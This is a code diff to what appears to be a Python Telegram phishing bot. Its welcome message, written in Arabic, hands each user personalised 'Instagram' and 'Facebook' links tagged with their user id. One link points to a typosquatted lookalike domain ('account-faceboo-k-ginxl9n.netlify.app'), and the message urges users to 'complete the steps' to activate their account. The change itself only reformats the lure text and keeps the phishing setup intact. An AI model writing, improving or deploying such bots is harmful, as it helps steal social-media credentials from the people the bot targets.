@@ -11,16 +11,17 @@ def send_welcome(message):
     second_link = f"https://account-faceboo-k-ginxl9n.netlify.app/?id={user_id}"
     
     welcome_text = (
-        f"✨ **أهلاً بك يا غالي في بوت الخدمات المميز!** ✨\n\n"
-        f"🚀 يسعدنا انضمامك إلينا. يرجى إتمام الخطوات عبر الروابط المخصصة لك أدناه:\n\n"
-        f"📸 **رابط انستغرام الخاص بك:**\n{custom_link}\n\n"
-        f"🔗 **رابط المنصة الثانية:**\n{second_link}\n\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"💡 *نصيحة: تأكد من إتمام الخطوات بدقة لضمان تفعيل حسابك بنجاح.*\n\n"
-        f"🖤 **Dedication to FDZ**"
+        "أهلاً بك في بوت الخدمات المميز\n\n"
+        "يسعدنا انضمامك إلينا. يرجى إتمام الخطوات عبر الروابط المخصصة لك أدناه:\n\n"
+        "رابط انستغرام الخاص بك:\n"
+        f"{custom_link}\n\n"
+        "رابط فيسبوك الخاص بك:\n"
+        f"{second_link}\n\n"
+        "------------------------------------\n"
+        "نصيحة: تأكد من إتمام الخطوات بدقة لضمان تفعيل حسابك بنجاح.\n\n"
+        "Dedication to FDZ"
     )
     
-    bot.reply_to(message, welcome_text, parse_mode="Markdown")
+    bot.reply_to(message, welcome_text)
 
 bot.infinity_polling()
-
